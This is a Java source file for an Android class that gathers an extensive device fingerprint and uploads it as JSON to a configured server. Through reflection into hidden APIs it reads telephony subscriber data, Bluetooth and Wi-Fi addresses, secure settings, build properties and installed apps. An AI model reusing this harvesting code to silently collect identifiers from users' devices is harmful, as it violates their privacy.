package com.example.administrator.hookandroid.Info;

import android.app.Activity;
import android.app.ActivityManager;
import android.bluetooth.BluetoothAdapter;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.DhcpInfo;
import android.net.NetworkInfo;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.UserHandle;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.util.Log;
import android.webkit.WebView;
import android.widget.Toast;

import com.example.administrator.hookandroid.Json.JSONObjectEx;
import com.example.administrator.hookandroid.Network.HTTPSender;
import com.example.administrator.hookandroid.Util.APPSettings;
import com.example.administrator.hookandroid.Util.JSONObjectUtil;
import com.example.administrator.hookandroid.Util.JSONStringUtil;
import com.example.administrator.hookandroid.Util.SystemPropertiesUtil;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.FileReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Enumeration;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import common.modules.util.HLog;
import common.modules.util.IFileUtil;
import common.modules.util.IReflectUtil;

public class DeviceInfo {

    private static final String TAG = "DeviceInfo";
    private static Handler bgHandler = null;
    private static Handler mainHandler = null;

    static {
        mainHandler = new Handler();
    }

    public static Handler getMainHandler() {
        return mainHandler;
    }

    public static Handler getBGHandler() {
        if (bgHandler == null) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    Log.d(TAG, "start loop");
                    Looper.prepare();
                    bgHandler = new Handler(Looper.myLooper());
                    synchronized (DeviceInfo.class) {
                        try {
                            DeviceInfo.class.notify();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    Looper.loop();
                    Log.d(TAG, "end loop");
                }
            }, "device_info_bg_thread").start();

            synchronized (DeviceInfo.class) {
                try {
                    DeviceInfo.class.wait();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        return bgHandler;
    }

    public static void uploadDeviceInfoInBGThread(final Context context, final String tableName) {
        getBGHandler().postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    Log.d(TAG, "Start Post Device Info");
                    JSONObject result = DeviceInfo.getDeviceInfo(context);
                    String resultJson = result.toString();
                    Log.d(TAG, JSONStringUtil.jsonFormart(resultJson));
                    String uploadURL = APPSettings.getUploadPhoneInfoAPI(context, tableName);
                    JSONObject res = HTTPSender.post(uploadURL, resultJson);

                    Log.d(TAG, "<<<<< - Upload Result - >>>>>" + res.toString());
                } catch (Exception e) {
                    Log.d(TAG, "------------->>> Exception <<<-------------");
                    Log.d(TAG, e.toString());
                    e.printStackTrace();
                }
            }
        }, 5 * 1000);
    }


    public static JSONObject getDeviceInfo(final Context context) {     // do remember run this  method on a background thread
        JSONObject result = new JSONObject();





        // 1. compile/build info _______________________________________
        JSONObject buildResult = new JSONObject();

        JSONObject buildJson = new JSONObject(IReflectUtil.objectFieldNameValues(Build.class));
        JSONObject buildJsonInfo = JSONObjectUtil.transformJSONObjectKeys(buildJson, new JSONObjectUtil.KeyTransformer() {
            @Override
            public String transformAction(String key, Object value) {
                return "Build." + key;
            }
        });
        JSONObject buildVersionJson = new JSONObject(IReflectUtil.objectFieldNameValues(Build.VERSION.class));
        JSONObject buildVersionJsonInfo = JSONObjectUtil.transformJSONObjectKeys(buildVersionJson, new JSONObjectUtil.KeyTransformer() {
            @Override
            public String transformAction(String key, Object value) {
                return "Build.VERSION." + key;
            }
        });
        JSONObject buildVersionCodesJson = new JSONObject(IReflectUtil.objectFieldNameValues(Build.VERSION_CODES.class));
        JSONObject buildVersionCodesJsonInfo = JSONObjectUtil.transformJSONObjectKeys(buildVersionCodesJson, new JSONObjectUtil.KeyTransformer() {
            @Override
            public String transformAction(String key, Object value) {
                return "Build.VERSION_CODES." + key;
            }
        });
        JSONObjectUtil.mergeJSONObject(buildResult, buildJsonInfo);
        JSONObjectUtil.mergeJSONObject(buildResult, buildVersionJsonInfo);
//        JSONObjectUtil.mergeJSONObject(result, buildVersionCodesJsonInfo);





        // 2. telephony info _______________________________________
        JSONObject telephonyResult = new JSONObject();

        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        Object iPhoneSubInfo = IReflectUtil.invokeMethod(telephonyManager, "getSubscriberInfo", new Class[]{}, new Object[] {});
        Object iTelephony = IReflectUtil.invokeMethod(telephonyManager, "getITelephony", new Class[]{}, new Object[] {});
        Map<?, ?> resultInfo = IReflectUtil.invokeObjectAllNonVoidZeroArgsMethods(iPhoneSubInfo);
        Map<?, ?> resultTelephony = IReflectUtil.invokeObjectAllNonVoidZeroArgsMethods(iTelephony);

        JSONObjectUtil.mergeJSONObject(telephonyResult, new JSONObjectEx(resultInfo));
        JSONObjectUtil.mergeJSONObject(telephonyResult, new JSONObjectEx(resultTelephony));

        telephonyResult = JSONObjectUtil.transformJSONObjectKeys(telephonyResult, new JSONObjectUtil.KeyTransformer() {
            @Override
            public String transformAction(String key, Object value) {
                return "Telephony." + key.replaceFirst("get", "");
            }
        });

        // TODO _________________________
        Map<?, ?> telephonyManagerMap = IReflectUtil.invokeObjectAllNonVoidZeroArgsMethods(telephonyManager);
        JSONObject telephonyManagerJson = new JSONObjectEx(telephonyManagerMap);
        telephonyManagerJson = JSONObjectUtil.transformJSONObjectKeys(telephonyManagerJson, new JSONObjectUtil.KeyTransformer() {
            @Override
            public String transformAction(String key, Object value) {
                return "Telephony." + key.replaceFirst("get", "");
            }
        });
        try {
            String mmsUA = telephonyManager.getMmsUserAgent();  // mContext.getResources().getString(com.android.internal.R.string.config_mms_user_agent);
            int res_id_config = (Integer) IReflectUtil.objectFieldValue(Class.forName("com.android.internal.R$string"), "config_mms_user_agent");
            String mmsUserAgent = context.getResources().getString(res_id_config);
            Log.d("", mmsUA == mmsUserAgent ? "true" : "false");
        } catch (Exception e) {
            e.printStackTrace();
        }
        // 因为 TelephonyManager 里的方法，多数是通过调 getSubscriberInfo 或 getITelephony 或 SystemProperties 来来返回信息的
        // TODO ... 还有就是调用 mContext.getResources() 的处理





        // 3. connectivity info _______________________________________
        JSONObject connectivityResult = new JSONObject();

        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        Object connectivityService  = IReflectUtil.objectFieldValue(connectivityManager, "mService");
        Map<?, ?> connectivityInfo = IReflectUtil.invokeObjectAllNonVoidZeroArgsMethods(connectivityService);

        JSONObjectUtil.mergeJSONObject(connectivityResult, new JSONObjectEx(connectivityInfo));
        connectivityResult = JSONObjectUtil.transformJSONObjectKeys(connectivityResult, new JSONObjectUtil.KeyTransformer() {
            @Override
            public String transformAction(String key, Object value) {
                return "Connectivity." + key.replaceFirst("get", "");
            }
        });

        try {
            JSONObject networkInfoJson = new JSONObject();
            for (int i = 0; i < 5; i++) {
                try {
                    NetworkInfo info = connectivityManager.getNetworkInfo(i);
                    Map<?, ?> infoMap = IReflectUtil.objectFieldNameValues(info);
                    JSONObject infoJson = new JSONObjectEx(infoMap);
                    networkInfoJson.put("PARAM_int_" + i, infoJson);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            connectivityResult.put("Connectivity.NetworkInfo", networkInfoJson);

            JSONObject networkQualityJson = new JSONObject();
            for (int i = 0; i < 5; i++) {
                try {
                    Object info = IReflectUtil.invokeMethod(connectivityService, "getLinkQualityInfo", new Class[]{int.class}, new Object[]{i});
                    Map<?, ?> infoMap = IReflectUtil.objectFieldNameValues(info);
                    JSONObject infoJson = new JSONObjectEx(infoMap);
                    networkQualityJson.put("PARAM_int_" + i, infoJson);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            connectivityResult.put("Connectivity.LinkQualityInfo", networkQualityJson);

        } catch (Exception e) {
            e.printStackTrace();
        }



        // check
        NetworkInfo[] allNetworkInfo = connectivityManager.getAllNetworkInfo();
        String networkConnectType = "UNKNOWN";
        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
        if (networkInfo != null && networkInfo.isConnected()) {
            int type = networkInfo.getType();
            if (type == ConnectivityManager.TYPE_WIFI) {
                networkConnectType = "WIFI";
            } else if (type == ConnectivityManager.TYPE_MOBILE) {
                int networkType = telephonyManager.getNetworkType();
                switch (networkType) {
                    case TelephonyManager.NETWORK_TYPE_LTE:
                        networkConnectType = "4G";
                    default:
                        networkConnectType = "2G/3G";
                }
            }
        }
        // TODO ... hook service 的返回值是 NetworkInfo 等等不是基本数据类型的，还没实现


        // 4. memory & cpu info etc _______________________________________
        ActivityManager am = (ActivityManager)context.getSystemService(Context.ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo amMemoryInfo = new ActivityManager.MemoryInfo();
        am.getMemoryInfo(amMemoryInfo);
        Map<String, Object> amMemoryInfoMap = (Map<String, Object>)IReflectUtil.objectFieldNameValues(amMemoryInfo);
        JSONObject amMemoryInfoJson = new JSONObject(amMemoryInfoMap);

        JSONObject infoInProc = new JSONObject();
        JSONObject procResult = HardwareHelper.getInfoInProc();
        try {
            infoInProc.put("Files.Contents", procResult);
        } catch (Exception e) {
            e.printStackTrace();
        }


        // 5. battery info _______________________________________
        final JSONObject batteryResult = new JSONObject();

        HLog.log("正在获取电池信息...");
        context.registerReceiver(new BroadcastReceiver() {
            public void onReceive(Context context, Intent intent) {
                String action = intent.getAction();
                // i.e. {technology=Li-poly, icon-small=17302984, health=2, status=5, plugged=2, present=true, level=100, scale=100, temperature=338, voltage=4277, invalid_charger=0}
                //1. unparcel() first, then get mMap field value. but after unparcel(), mParcelledData will set to null.
                Bundle bundle = intent.getExtras();
                IReflectUtil.invokeMethod(bundle, "unparcel", new Class[]{}, new Object[]{});
                Map<String, Object> mMap = (Map<String, Object>) IReflectUtil.objectFieldValue(bundle, "mMap");
                JSONObject bundleInfos = new JSONObject(mMap);

                if (action.equals(Intent.ACTION_BATTERY_CHANGED)) {
                    int level = intent.getIntExtra("level", 0);  //电池剩余电量
                    int scale = intent.getIntExtra("scale", 0); //获取电池满电量数值
                    String technology = intent.getStringExtra("technology");  //获取电池技术支持
                    int status = intent.getIntExtra("status",BatteryManager.BATTERY_STATUS_UNKNOWN);  //获取电池状态
                    int plugged = intent.getIntExtra("plugged", 0);  //获取电源信息
                    int health = intent.getIntExtra("health",BatteryManager.BATTERY_HEALTH_UNKNOWN); //获取电池健康度
                    int voltage = intent.getIntExtra("voltage", 0);  //获取电池电压
                    int temperature = intent.getIntExtra("temperature", 0); //获取电池温度

                    try {
                        batteryResult.put("Battery.ACTION_BATTERY_CHANGED", bundleInfos);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    HLog.log("获取电池信息成功...");
                    DeviceInfo.iNotify();
                }
            }
        }, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        // 以免获取电池信息一直没有回调
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                HLog.log("获取电池信息超时...");
                DeviceInfo.iNotify();
            }
        }, 30000);
        DeviceInfo.iWait();

        // Now NO Need to handle ACTION_BATTERY_LOW, ACTION_BATTERY_OKAY, ACTION_POWER_CONNECTED, ACTION_POWER_DISCONNECTED
        // Here just for observe
        IntentFilter intentFilter = new IntentFilter();
//        intentFilter.addAction(Intent.ACTION_BATTERY_CHANGED);
        intentFilter.addAction(Intent.ACTION_BATTERY_LOW);
        intentFilter.addAction(Intent.ACTION_BATTERY_OKAY);
        intentFilter.addAction(Intent.ACTION_POWER_CONNECTED);
        intentFilter.addAction(Intent.ACTION_POWER_DISCONNECTED);
        context.registerReceiver(new BroadcastReceiver() {
            public void onReceive(Context context, Intent intent) {
                String action = intent.getAction();
                String tips  = "[NULL]";

                Bundle bundle = intent.getExtras();
                if (bundle != null) {
                    IReflectUtil.invokeMethod(bundle, "unparcel", new Class[]{}, new Object[]{});
                    Map<String, Object> mMap = (Map<String, Object>) IReflectUtil.objectFieldValue(bundle, "mMap");
                    JSONObject bundleInfos = new JSONObject(mMap);
                    tips = bundleInfos.toString();
                }

                Toast.makeText(context, "action: " + action + ", info: " + tips, Toast.LENGTH_LONG).show();
            }
        }, intentFilter);







        // 6. telephony properties _______________________________________
        HLog.log("正在获取SystemProperties...");
        final String __SystemPropertiesPrefix__ = "SystemProperties.";
        JSONObject teleProperties = DeviceInfo.getTelephonySystemProperties();
        JSONObject telePropInfos = JSONObjectUtil.transformJSONObjectKeys(teleProperties, new JSONObjectUtil.KeyTransformer() {
            @Override
            public String transformAction(String key, Object value) {
                return __SystemPropertiesPrefix__ + key;
            }
        });
        // system properties
        JSONObject buildProperties = getSystemBuildProperties();
        JSONObject systemPropInfo = JSONObjectUtil.transformJSONObjectKeys(buildProperties, new JSONObjectUtil.KeyTransformer() {
            @Override
            public String transformAction(String key, Object value) {
                return __SystemPropertiesPrefix__ + key;
            }
        });


        // 7. telephony properties copy: /system/build.prop  _______________________________________
        String systemBuildProp = IFileUtil.readFileToText("/system/build.prop");
        JSONObject systemBuildInfo = new JSONObject();
        try {
            systemBuildInfo.put("/system/build.prop", systemBuildProp);
        }catch (Exception e) {
            e.printStackTrace();
        }


        try {
            List<NetworkInterface> list = Collections.list(NetworkInterface.getNetworkInterfaces());
            for(NetworkInterface networkInterface: list){
                if (networkInterface.getName().equalsIgnoreCase("wlan0")) {
                    byte[] hardwareAddress = networkInterface.getHardwareAddress();
                    if (hardwareAddress != null) {
                        StringBuilder stringBuilder = new StringBuilder();
                        int length = hardwareAddress.length;
                        for ( int i = 0; i < length; i++) {
                            stringBuilder.append(String.format("%02X:",  new Object[]{
                                    Byte.valueOf(hardwareAddress[i])
                            }));
                        }
                        if (stringBuilder.length() > 0) {
                            stringBuilder.deleteCharAt(stringBuilder.length()  - 1);
                        }
                        String macAddress = stringBuilder.toString().toUpperCase().trim();
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }





        // display info
        HLog.log("正在获取DisplayInfo...");
        DisplayMetrics displayMetrics = new DisplayMetrics();
        ((Activity) context).getWindowManager().getDefaultDisplay().getMetrics(displayMetrics);
        JSONObject displayMetricsJson = new JSONObject(IReflectUtil.objectFieldNameValues(displayMetrics, new IReflectUtil.FieldFilter() {
            @Override
            public boolean filterAction(Field field) {
                Class fieldType = field.getType();
                // for final primitive type, compiler optimized
                if (Modifier.isFinal(field.getModifiers()) && (fieldType.equals(long.class)
                        || fieldType.equals(double.class)
                        || fieldType.equals(float.class)
                        || fieldType.equals(int.class)
                        || fieldType.equals(boolean.class))) {
                    return true;
                }
                return false;
            }
        }));
        final String __ScreenPrefix__ = "Screen.";
        JSONObject displayInfo = JSONObjectUtil.transformJSONObjectKeys(displayMetricsJson, new JSONObjectUtil.KeyTransformer() {
            @Override
            public String transformAction(String key, Object value) {
                return __ScreenPrefix__ + key;
            }
        });

        // bluetooth info
        JSONObject bluetoothInfo = new JSONObject();
        String bluetoothName = android.bluetooth.BluetoothAdapter.getDefaultAdapter().getName();
        String bluetoothAddress = android.bluetooth.BluetoothAdapter.getDefaultAdapter().getAddress();
        try {
            bluetoothInfo.put("Bluetooth.Name", bluetoothName);
            bluetoothInfo.put("Bluetooth.Address", bluetoothAddress);
        } catch (Exception e) {
            e.printStackTrace();
        }

        // wifi info
        JSONObject wifiJsonInfo = new JSONObject();
        try {
            WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            Map wifiConInfoJsonMap = IReflectUtil.invokeObjectAllGetMethods(wifiInfo);
            JSONObject wifiConInfoJson = new JSONObject(wifiConInfoJsonMap);
            JSONObject connectionInfo = JSONObjectUtil.transformJSONObjectKeys(wifiConInfoJson, new JSONObjectUtil.KeyTransformer() {
                @Override
                public String transformAction(String key, Object value) {
                    return key.replaceFirst("get", "");
                }
            });
            wifiJsonInfo.put("Wifi.ConnectionInfo", connectionInfo);

            // scan result
            List<ScanResult> scanResults = wifiManager.getScanResults();
            JSONArray array = handlerWIFIScanResults(scanResults);
            wifiJsonInfo.put("Wifi.ScanResults", array);

            // dhcp info
            DhcpInfo dhcpInfo = wifiManager.getDhcpInfo();
            String dhcpInfoString = JSONObjectUtil.objToJson(dhcpInfo);
            JSONObject jsonObject = new JSONObject(dhcpInfoString);
            jsonObject.remove("CREATOR");
            wifiJsonInfo.put("Wifi.DhcpInfo", jsonObject);

            // configure
            List<WifiConfiguration> cons = wifiManager.getConfiguredNetworks();
            Log.d(TAG, cons.toString());

        } catch (Exception e) {
            e.printStackTrace();
        }

        // network interfaces
        try {
            NetworkInterface aInterface = (NetworkInterface) IReflectUtil.invokeMethod(NetworkInterface.class, "getByName", new Class[]{String.class}, new Object[]{"wlan0"});
            String invokeResult = (String) IReflectUtil.invokeMethod(aInterface, "getName", new Class[]{}, new Object[]{});

            Enumeration<NetworkInterface> netInterfaces = NetworkInterface.getNetworkInterfaces();
            while (netInterfaces.hasMoreElements()) {
                NetworkInterface anInterface = netInterfaces.nextElement();
                Log.d(TAG, "NetworkInterface: " + anInterface.toString() + ", DisplayName: " + anInterface.getDisplayName() + ", Name: " + anInterface.getName());
                Enumeration<InetAddress> ips = anInterface.getInetAddresses();
                while (ips.hasMoreElements()) {
                    InetAddress inetAddress = ips.nextElement();
                    Log.d(TAG, "InetAddress: " + inetAddress.toString());
                    boolean isSiteLocalAddress = inetAddress.isSiteLocalAddress();
                    boolean isLoopbackAddress = inetAddress.isLoopbackAddress();
                    String hostAddress = inetAddress.getHostAddress();
                    Log.d(TAG, hostAddress + " " + isSiteLocalAddress + " " + isLoopbackAddress);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }



        // Settings
        JSONObject settingsSystemInfo = getSettings(context, android.provider.Settings.System.class);
        JSONObject settingsGlobalInfo = getSettings(context, android.provider.Settings.Global.class);
        JSONObject settingsSecureInfo = getSettings(context, android.provider.Settings.Secure.class);

        JSONObject settingsOutterInfo = new JSONObject();
        try {
            JSONObject settingsInfo = new JSONObject();
            settingsInfo.put("System", settingsSystemInfo);
            settingsInfo.put("Global", settingsGlobalInfo);
            settingsInfo.put("Secure", settingsSecureInfo);
            settingsOutterInfo.put("Settings", settingsInfo);
        } catch (Exception e) {
            e.printStackTrace();
        }

        // System property
        JSONObject runtimePropertieInfo = new JSONObject();
        Properties properties = System.getProperties();
        Enumeration enu = properties.propertyNames();
        while (enu.hasMoreElements()) {
            String key = (String) enu.nextElement();
            Object propertyVal = properties.get(key);
            try {
                runtimePropertieInfo.put("System." + key, propertyVal);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        // Webkit USER AGENT
        HLog.log("正在获取WebKit.UserAgent...");
        final JSONObject userAgentInfo = new JSONObject();
        getMainHandler().post(new Runnable() {
            @Override
            public void run() {
                String userAgent = new WebView(context).getSettings().getUserAgentString();
                try {
                    userAgentInfo.put("WebKit.UserAgent", userAgent);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                synchronized (DeviceInfo.class) {
                    try {
                        DeviceInfo.class.notify();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        });
        synchronized (DeviceInfo.class) {
            try {
                DeviceInfo.class.wait();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        HLog.log("获取WebKit.UserAgent成功...");



        // Get PreInstalled APP Info _______________________________________
        JSONObject installedPackagesInfo = new JSONObject();
        JSONObject packagesInfo = new JSONObject();
        PackageManager packageManager = context.getPackageManager();
//        int flags = PackageManager.GET_ACTIVITIES | PackageManager.GET_RECEIVERS | PackageManager.GET_SERVICES ;
        int flags = 0;
        List<PackageInfo> packageInfos = packageManager.getInstalledPackages(flags);
        for (PackageInfo info : packageInfos) {
            try {
                Map<?, ?> map = IReflectUtil.objectFieldNameValues(info);
                JSONObjectEx jsonInfo = new JSONObjectEx(map);
                // packageName
                String packageName = jsonInfo.optString("packageName");

                // remove the in template -------------------------
                if (packageName.startsWith("com.android") || packageName.startsWith("com.cyanogenmod") || packageName.startsWith("org.cyanogenmod")
                        || packageName.startsWith("com.qualcomm")) {
                    continue;
                }
                // applicationInfo
                final JSONObject new_applicationInfo = new JSONObject();
                String keys_applicationInfo[] = new String[]{"sourceDir", "publicSourceDir", "className", "dataDir"};
                final ArrayList<String> need_keys_applicationInfo = new ArrayList<String>();
                for (String k : keys_applicationInfo) {
                    need_keys_applicationInfo.add(k);
                }
                JSONObject applicationInfo = jsonInfo.optJSONObject("applicationInfo");
                JSONObjectUtil.iterateJSONObject(applicationInfo, new JSONObjectUtil.IterateHandler() {
                    @Override
                    public void iterateAction(String key, Object value) {
                        try {
                            if (need_keys_applicationInfo.contains(key)) {
                                new_applicationInfo.put(key, value);
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                });

                // jsonInfo
                final JSONObject new_jsonInfo = new JSONObject();
                String keys_jsonInfo[] = new String[]{"firstInstallTime", "lastUpdateTime", "versionCode", "versionName"};
                final ArrayList<String> need_keys_jsonInfo = new ArrayList<String>();
                for (String k : keys_jsonInfo) {
                    need_keys_jsonInfo.add(k);
                }
                JSONObjectUtil.iterateJSONObject(jsonInfo, new JSONObjectUtil.IterateHandler() {
                    @Override
                    public void iterateAction(String key, Object value) {
                        try {
                            if (need_keys_jsonInfo.contains(key)) {
                                new_jsonInfo.put(key, value);
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                });
                new_jsonInfo.put("packageName", packageName);
                new_jsonInfo.put("applicationInfo", new_applicationInfo);
                // remove the in template -------------------------

                packagesInfo.put(packageName, new_jsonInfo);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        try {
            installedPackagesInfo.put("Package.InstalledPackages", packagesInfo);
        } catch (Exception e) {
            e.printStackTrace();
        }



        // merges
        JSONObjectUtil.mergeJSONObject(result, buildResult);
        JSONObjectUtil.mergeJSONObject(result, telephonyResult);
        JSONObjectUtil.mergeJSONObject(result, connectivityResult);
        JSONObjectUtil.mergeJSONObject(result, batteryResult);
        JSONObjectUtil.mergeJSONObject(result, telePropInfos);
        JSONObjectUtil.mergeJSONObject(result, systemPropInfo);
        JSONObjectUtil.mergeJSONObject(result, systemBuildInfo);
        JSONObjectUtil.mergeJSONObject(result, displayInfo);
        JSONObjectUtil.mergeJSONObject(result, bluetoothInfo);
        JSONObjectUtil.mergeJSONObject(result, wifiJsonInfo);
        JSONObjectUtil.mergeJSONObject(result, settingsOutterInfo);
        JSONObjectUtil.mergeJSONObject(result, runtimePropertieInfo);
        JSONObjectUtil.mergeJSONObject(result, userAgentInfo);
        JSONObjectUtil.mergeJSONObject(result, infoInProc);
        JSONObjectUtil.mergeJSONObject(result, installedPackagesInfo);

        HLog.log("获取设备信息成功，正在返回数据...");
        return result;
    }

    public static void iWait() {
        synchronized (DeviceInfo.class) {
            try {
                DeviceInfo.class.wait();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static void iNotify() {
        synchronized (DeviceInfo.class) {
            try {
                DeviceInfo.class.notify();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static JSONObject getSettings(Context context, final Class settingCls) {
        final JSONObject settingsResultJson = new JSONObject();
        try {
            // parameter 1
            final ContentResolver resolver = context.getContentResolver();

            // parameter 3
//            int userHandleId = UserHandle.myUserId();
            Method myUserIdMethod = UserHandle.class.getDeclaredMethod("myUserId", new Class[]{});
            myUserIdMethod.setAccessible(true);
            final Integer userHandleId = (Integer) myUserIdMethod.invoke(UserHandle.class, new Object[]{});

            final Method getStringForUserMethod = settingCls.getDeclaredMethod("getStringForUser", new Class[]{ContentResolver.class, String.class, int.class});
            getStringForUserMethod.setAccessible(true);

            JSONObject fieldNamesValues = new JSONObject(IReflectUtil.objectFieldNameValues(settingCls));
            JSONObjectUtil.iterateJSONObject(fieldNamesValues, new JSONObjectUtil.IterateHandler() {
                @Override
                public void iterateAction(String key, Object value) {
                    if (value instanceof String) {
                        // parameter 2
                        final String settingKey = (String) value;
                        try {
                            String v = (String) getStringForUserMethod.invoke(settingCls, new Object[]{resolver, settingKey, userHandleId});
                            settingsResultJson.put(settingKey, v);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
        return settingsResultJson;
    }

    public static JSONObject getSystemBuildProperties() {
        JSONObject buildProperties = new JSONObject();
        try {
            Properties properties = new Properties();
            BufferedReader brd = new BufferedReader(new FileReader("/system/build.prop"));
//            InputStreamReader isr = new InputStreamReader(context.getAssets().open("build.prop"),"UTF-8");
            properties.load(brd);
            Enumeration enu = properties.propertyNames();
            while (enu.hasMoreElements()) {
                String key = (String) enu.nextElement();
//                Object propertyVal = SystemPropertiesUtil.get(key);   // all will be string ...
                Object propertyVal = properties.get(key);
                buildProperties.put(key, propertyVal);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return buildProperties;
    }


    public static JSONObject getTelephonySystemProperties() {
        JSONObject result = new JSONObject();
        try {
            JSONObject jsonObject = new JSONObject(IReflectUtil.objectFieldNameValues(Class.forName("com.android.internal.telephony.TelephonyProperties")));
            java.util.Iterator iterator = jsonObject.keys();
            while (iterator.hasNext()) {
                String fieldName = (String) iterator.next();
                Object fieldValue = jsonObject.get(fieldName);
                if (fieldValue instanceof String) {
                    String key = (String) fieldValue;
                    Object propertyVal = SystemPropertiesUtil.get(key);
                    result.put(key, propertyVal);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return result;
    }

    public static Object invokeIBluetoothManagerMethod(String methodName) {
        try {
            BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
            Field field = BluetoothAdapter.class.getDeclaredField("mManagerService");
            field.setAccessible(true);
            Object bluetoothManagerService = field.get(bluetoothAdapter);
            if (bluetoothManagerService == null) {
                return null;
            }
            Method method = bluetoothManagerService.getClass().getMethod(methodName);
            if (method != null) {
                Object obj = method.invoke(bluetoothManagerService);
                return obj;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static JSONArray handlerWIFIScanResults(List<ScanResult> scanResults) {
        JSONArray array = new JSONArray();
        for (int i = 0; i < scanResults.size(); i++) {
            // SSID: abc-wifi, BSSID: 78:44:88:88:88:88, capabilities: caps, level: 1, frequency: 2, timestamp: 3, distance: ?(cm), distanceSd: ?(cm)
            ScanResult oneResult = scanResults.get(i);
            String string = oneResult.toString();

            // string to json
            JSONObject jsonObj = new JSONObject();
            String[] keyValues = string.split(",");
            for (int j = 0; j < keyValues.length; j++) {
                try {
                    String keyValue = keyValues[j];
                    String[] splits = keyValue.split(": ");
                    if (splits.length < 2) continue;

                    String key = splits[0].trim();
                    Object value = splits[1].trim();

                    // convert value
                    if (key.equals("SSID")) {
                    } else if (key.equals("BSSID")) {
                    } else if (key.equals("capabilities")) {
                    } else if (key.equals("level") || key.equals("frequency")) {
                        value = Integer.parseInt((String) value);
                    } else if (key.equals("timestamp")) {
                        value = Long.parseLong((String) value);
                    } else if (key.equals("distance") || key.equals("distanceSd")) {
                        Pattern p = Pattern.compile("\\d+");
                        Matcher m = p.matcher((String) value);
                        if (m.find()) {
                            value = m.group(0);
                        } else {
                            value = "-1";
                        }
                        value = Integer.parseInt((String) value);
                    }
                    jsonObj.put(key, value);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            array.put(jsonObj);
        }

        return array;
    }

}
